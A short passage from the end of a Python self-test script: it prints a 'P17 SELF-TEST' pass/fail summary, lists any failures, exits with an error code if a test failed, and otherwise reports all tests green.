    print("\n" + "=" * 53)
    print(" P17 SELF-TEST: %d PASS / %d FAIL" % (len(PASS), len(FAIL)))
    if FAIL:
        for n, d in FAIL:
            print("  FAIL: %s -> %s" % (n, str(d)[:120]))
        sys.exit(1)
    print(" ALL GREEN \u2705")


if __name__ == "__main__":
    main()
